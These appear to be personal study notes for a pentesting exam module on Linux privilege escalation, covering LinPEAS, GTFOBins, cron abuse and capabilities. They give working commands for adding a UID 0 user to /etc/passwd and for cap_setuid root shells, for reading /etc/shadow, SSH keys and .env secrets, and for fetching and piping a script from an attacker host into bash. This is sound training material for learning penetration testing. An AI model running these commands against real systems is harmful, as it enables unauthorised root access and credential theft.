# Module 18 Linux Privilege Escalation

---

## General methodology

**Linux Privilege Escalation — Systematic Methodology**

**Phase 1 — Automated scan first (run this immediately):**
```bash
# Transfer and run LinPEAS
wget http://YOUR_IP/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh | tee /tmp/output.txt
```

While it runs, start manual checks in another session. When it finishes, focus on **RED/YELLOW** highlights first — those are near-confirmed vectors.

**Phase 2 — Manual checks in priority order:**

**1. Who am I and what can I do:**
```bash
id                    # check groups (docker, lxd, sudo, adm)
sudo -l               # what can I run as root
```
If `sudo -l` shows anything → check GTFOBins immediately.
If groups show `docker`/`lxd` → instant privesc via GTFOBins.

**2. SUID and capabilities:**
```bash
find / -perm -u=s -type f 2>/dev/null
getcap -r / 2>/dev/null
```
Cross-reference unusual binaries with GTFOBins.

**3. Cron jobs:**
```bash
cat /etc/crontab
ls -la /etc/cron.d/
# Run pspy to catch hidden ones
/tmp/pspy64
```
Look for root scripts you can write to.

**4. Writable sensitive files:**
```bash
ls -la /etc/passwd    # can I inject a root user?
ls -la /etc/shadow    # can I read/write hashes?
```

**5. Credentials hunting:**
```bash
cat ~/.bash_history
cat /var/www/html/config.php
cat /home/*/.ssh/id_rsa
env
grep -r "password" /var/www/ 2>/dev/null
```

**6. Internal services:**
```bash
ss -tulnp              # services on 127.0.0.1 not visible externally
```

**7. Kernel exploit (last resort):**
```bash
uname -a               # get kernel version
# searchsploit linux kernel <version>
```

**The decision tree:**

```
Run LinPEAS
  ↓
RED/YELLOW finding? → exploit it
  ↓ (if nothing obvious)
sudo -l shows something? → GTFOBins → root
  ↓
Dangerous group (docker/lxd)? → GTFOBins → root
  ↓
Unusual SUID/capability? → GTFOBins → root
  ↓
Writable root cron script? → inject reverse shell → root
  ↓
Writable /etc/passwd? → inject UID 0 user → root
  ↓
Credentials found? → su/ssh to higher user → repeat process
  ↓
Nothing else? → kernel exploit (last resort, can crash box)
```

**How to actually read LinPEAS:**

Don't read top to bottom. Instead:

1. **Ctrl+F for the color legend** — LinPEAS prints what red/yellow means at the top
2. **Scroll for RED/YELLOW** — these are the "99% a vector" findings
3. **Jump to these specific sections:**
   - "Sudo" section
   - "SUID" section
   - "Capabilities" section
   - "Cron jobs" section
   - "Interesting writable files"
   - "Credentials" / "passwords"

**The habit that makes LinPEAS useful:**
```bash
# Save output, then grep for specifics
/tmp/linpeas.sh | tee out.txt

grep -i "password" out.txt
grep -iA5 "SUID" out.txt
grep -iA5 "sudo" out.txt
```

**Memorize this priority (easiest to hardest):**
1. sudo -l → GTFOBins
2. Dangerous groups → GTFOBins
3. SUID/capabilities → GTFOBins
4. Cron abuse
5. Writable /etc/passwd
6. Credential reuse
7. Kernel exploit (last, risky)

**The one-sentence methodology:**
Run LinPEAS, check sudo/groups/SUID/capabilities against GTFOBins first, then cron and writable files, hunt for credentials everywhere, and only reach for kernel exploits when everything else fails.



---


## 18.1.2 Manual Enumeration:

**Linux Post-Exploitation Enumeration — Quick Reference**

**Identity and privileges:**
```bash
id                          # current user, groups
sudo -l                     # what can you run as root
cat /etc/passwd | grep -v nologin  # users with login shells
cat /etc/shadow             # password hashes (needs root)
cat /etc/sudoers            # sudo configuration (needs root)
```

**System info:**
```bash
uname -a                    # kernel version
cat /etc/os-release         # OS details
hostname                    # machine name
```

**Network:**
```bash
ip a                        # network interfaces
ss -tulnp                   # listening ports (internal services)
netstat -tulnp              # same thing (older systems)
cat /etc/hosts              # internal hostnames
```

**Interesting files:**
```bash
cat /home/<user>/.bash_history    # command history
cat /home/<user>/.ssh/id_rsa     # SSH private keys
ls -la /var/www/html/             # web app config files
cat /var/www/html/config.php      # database credentials
cat /var/www/html/.env            # environment secrets
```

**SUID binaries:**
```bash
find / -perm -u=s -type f 2>/dev/null
```
> use strings to read /bin/ files

Check results against GTFOBins.

**Cron jobs:**
```bash
cat /etc/crontab
ls /etc/cron.d/
cat /var/spool/cron/crontabs/*
```

**Writable directories:**
```bash
/tmp/
/var/tmp/
/dev/shm/
```

**Important groups to check from `id` output:**
- `sudo` → check sudo -l
- `docker` → instant privesc via GTFOBins
- `lxd` → same as docker
- `adm` → can read logs
- `shadow` → can read password hashes
- `disk` → raw disk access

**Automated enumeration:**
```bash
# Transfer and run LinPEAS
wget http://YOUR_IP/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh
```

**Priority order:**
1. `id` → check groups
2. `sudo -l` → check sudo permissions
3. Run LinPEAS → broad scan
4. SUID binaries → check GTFOBins
5. Cron jobs → look for writable scripts running as root
6. Internal services → hidden attack surfaces


---


## linPEAS my goat, my beloved, my everything 


**Transfer to target:**

Option 1 — Python HTTP server:
```bash
# On Kali
python3 -m http.server 80

# On target -- CAPITAL O !!!
wget http://YOUR_KALI_IP/linpeas.sh -O /tmp/linpeas.sh
# or
curl http://YOUR_KALI_IP/linpeas.sh -o /tmp/linpeas.sh
```

Option 2 — If no wget/curl on target:
```bash
# On Kali
nc -lnvp 9999 < linpeas.sh

# On target
nc YOUR_KALI_IP 9999 > /tmp/linpeas.sh
```

**Run it:**
```bash
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh
```

**Save output for review:**
```bash
/tmp/linpeas.sh | tee /tmp/linpeas_output.txt
```

**Reading the output — color coding:**
- **RED/YELLOW** — almost certain privesc vector, investigate immediately
- **Red** — highly suspicious, likely exploitable
- **Cyan** — interesting but needs manual verification
- **Green** — useful information
- **Blue** — general system info

**What to look for first in output:**
1. Any RED/YELLOW highlights
2. SUID binaries section
3. Writable files and directories
4. Cron jobs
5. Sudo permissions
6. Internal ports listening
7. Credentials in config files

**One liner — download and run without saving to disk:**
```bash
curl http://YOUR_KALI_IP/linpeas.sh | bash
```
This runs LinPEAS directly in memory without touching the filesystem — stealthier but no re-reading the output later.


Focus on the colors first — scan for RED/YELLOW highlights before reading anything else.

**Practical reading order:**

**1. Scroll to "Interesting Files" section**
Look for credentials, SSH keys, config files with passwords

**2. Check "SUID" section**
Cross-reference anything unusual with GTFOBins

**3. Check "Sudo" section**
Same as running `sudo -l` but formatted nicely

**4. Check "Cron Jobs" section**
Look for scripts running as root that you can modify

**5. Check "Internal Ports" section**
Services listening on localhost that weren't visible from outside

**6. Check "Users" section**
Groups, home directories, bash history files


**The habit:**
Run LinPEAS, save output with `tee`, then `grep` for specific things:
```bash
cat /tmp/linpeas_output.txt | grep -i "password"
cat /tmp/linpeas_output.txt | grep -i "suid"
```

---

## 18.2.2 Inspecting service footprints

```bash
watch -n 1 "ps -aux | grep pass"
```

---

## 18.3.1 Abusing Cron Jobs

cronjobs usually **run as root**, which allows you to gain privilege via reverse shell, or just opening a shell.

**Inspect the cron log file**
```bash
cat /etc/crontab              # view system cron jobs
ls -la /etc/cron.d/           # additional cron jobs
grep CRON /var/log/syslog     # see cron execution history
ls -la /path/to/script.sh     # check if you can write to it
```


---


## 18.3.2. Abusing password authentication

**The technique: writing a new root user to /etc/passwd**

**The misconfiguration:**
`/etc/passwd` is **writable by your user** (or world-writable). Normally only root can write to it.

**Why this works:**

`/etc/passwd` can optionally store password hashes directly in the second field (historically, before `/etc/shadow` existed). If you can write to `/etc/passwd`, you can add a new user with a known password and UID 0 (root).

**The conditions needed:**
1. You have **write permission** to `/etc/passwd`
2. Check with:
```bash
ls -la /etc/passwd
# If you see -rw-rw-rw- or your user has write access → vulnerable
```

**The exploitation:**

**Step 1 — Generate a password hash:**
```bash
openssl passwd -1 -salt abc password123
# Output: $1$abc$somehash
```

**Step 2 — Append a new root user to /etc/passwd:**
```bash
echo 'hacker:$1$abc$somehash:0:0:root:/root:/bin/bash' >> /etc/passwd
```

Breaking down that line:
```
hacker           → username you're creating
$1$abc$somehash  → the password hash you generated
0                → UID (0 = root)
0                → GID (0 = root group)
root             → description
/root            → home directory
/bin/bash        → shell
```

**Step 3 — Switch to your new root user:**
```bash
su hacker
# Enter password123
# You're now root
```

**Why UID 0 matters:**
UID 0 IS root. The username doesn't matter — Linux identifies root by UID 0, not by the name "root." So any user with UID 0 has full root privileges.

**The key insight:**
Normally `/etc/passwd` doesn't contain password hashes (they're in `/etc/shadow`). But `/etc/passwd` still **supports** storing a hash in that second field. If the field has a hash, the system uses it. So you inject a user with your known password hash and UID 0.

**Summary of conditions:**
- `/etc/passwd` is writable by you (the misconfiguration)
- You generate a hash with `openssl passwd`
- You append a UID 0 user with that hash
- You `su` to it with your known password



### Side notes for /etc/passwd

**How to read /etc/passwd — Quick Reference**

Every line has 7 colon-separated fields:

```
joe:x:1000:1000:joe,,,:/home/joe:/bin/bash
│   │ │    │    │      │          │
1   2 3    4    5      6          7
```

| # | Field | Meaning |
|---|-------|---------|
| 1 | Username | Login name |
| 2 | Password | `x` = hash is in /etc/shadow |
| 3 | UID | User ID number |
| 4 | GID | Primary group ID |
| 5 | GECOS | Description/comment field |
| 6 | Home | Home directory |
| 7 | Shell | Login shell |

**On the description (field 5 / GECOS):**

It's just a comment field for human-readable info. It can contain the user's full name, contact info, or a service description. It has **no security function** — it's purely descriptive.

Examples from your output:
```
systemd Time Synchronization,,,    → describes the service account
Gnats Bug-Reporting System (admin) → describes what this account is for
joe,,,                             → user's name with empty extra fields
```

The `,,,` are empty subfields (full name, room, work phone, home phone) separated by commas. Most are left blank, hence the commas with nothing between them.

**The critical fields for pentesting:**

**Field 2 (Password):**
- `x` → hash is in /etc/shadow (normal)
- An actual hash → password stored here directly (the privesc injection technique)
- Empty → no password required (rare, dangerous)

**Field 3 (UID) — MOST IMPORTANT:**
- `0` → root. ANY user with UID 0 is root, regardless of name
- `1-999` → system/service accounts
- `1000+` → regular human users

**Field 7 (Shell):**
- `/bin/bash` or `/bin/sh` → this account can log in
- `/usr/sbin/nologin` or `/bin/false` → account cannot log in (service account)


**Absolute must-know facts:**

1. **UID 0 = root.** Name is irrelevant. If you inject `hacker:...:0:0:...`, hacker IS root.

2. **`x` in field 2 means "check /etc/shadow."** A real hash there means the system uses it directly.

3. **Login shells matter.** `/bin/bash` = can log in. `/bin/false` or `/usr/sbin/nologin` = service account, can't log in normally.

4. **Regular users start at UID 1000.** In your output, joe (1000) and eve (1001) are the human users.

5. **Writable /etc/passwd = instant root.** If you can write to it, inject a UID 0 user.

**Quick privesc checks on /etc/passwd:**
```bash
# Is it writable? (the vulnerability)
ls -la /etc/passwd

# Any accounts with UID 0 besides root? (backdoors)
grep ":0:" /etc/passwd

# Any accounts with empty password fields?
cat /etc/passwd | awk -F: '($2==""){print $1}'

# Who can actually log in?
cat /etc/passwd | grep -v nologin | grep -v false
```


---


## 18.4.1 Abusing setuid binaries and Capabilities 

**Linux Capabilities — Quick Reference**


**Find location of `getcap`**
```bash
find / -name getcap 2>/dev/null
```

**Enumerate capabilities:**
```bash
getcap -r / 2>/dev/null
```

**Reading the output:**
```
/usr/bin/python3.8 = cap_setuid+ep
│                     │           │
binary                capability  flags
```

Flags:
- `e` = effective (active)
- `p` = permitted (allowed)
- `+ep` = fully active and usable

**Dangerous capabilities to look for:**

| Capability | What it allows |
|-----------|----------------|
| `cap_setuid` | Change UID to 0 (root) — most dangerous |
| `cap_setgid` | Change GID to 0 |
| `cap_dac_read_search` | Read ANY file, bypassing permissions |
| `cap_dac_override` | Write to ANY file, bypassing permissions |
| `cap_sys_admin` | Broad admin operations |
| `cap_sys_ptrace` | Attach to processes, dump memory |
| `cap_chown` | Change file ownership |

**Exploitation by binary (with cap_setuid):**

**Python:**
```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

**Perl:**
```bash
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

**Ruby:**
```bash
ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'
```

**PHP:**
```bash
php -r 'posix_setuid(0); system("/bin/bash");'
```

**node:**
```bash
node -e 'process.setuid(0); require("child_process").spawn("/bin/bash", {stdio: [0, 1, 2]})'
```

**With cap_dac_read_search (read any file):**

**tar:**
```bash
# Read /etc/shadow even without permission
tar xf /etc/shadow -O
```

**vim / view (with cap_dac_read_search):**
```bash
vim /etc/shadow
```

**Exploitation flow:**
1. Run `getcap -r / 2>/dev/null`
2. Look for any binary with `cap_setuid` or `cap_dac_*`
3. Match the binary to the command above, or check GTFOBins
4. Execute → root shell or read protected files

**Key distinction from SUID:**
- SUID → binary runs as file owner (all-or-nothing root)
- Capabilities → binary gets specific granular privileges

Both are enumerated separately, both can lead to privesc, both checked automatically by LinPEAS.

**GTFOBins:**
For any binary with capabilities, search it on GTFOBins under the "Capabilities" section for the exact exploit syntax:
https://gtfobins.github.io/

**Most common exam scenario:**
`python`, `perl`, or `tar` with `cap_setuid` set. If you see any scripting language with `cap_setuid+ep`, you have a direct root path.That covers capabilities thoroughly. The main takeaway: after checking SUID binaries, always run `getcap -r / 2>/dev/null` as a separate step. A scripting language with `cap_setuid+ep` is a direct root path.


## Exploiting kernel vulnerability + abusing sudo

abusing sudo -> gtfobins.org

```bash
#Transfer file
scp exploit.c username@192.168.50.100:

#convert c files into executable file
gcc exploit.c -o exploit

#run it
./exploit
```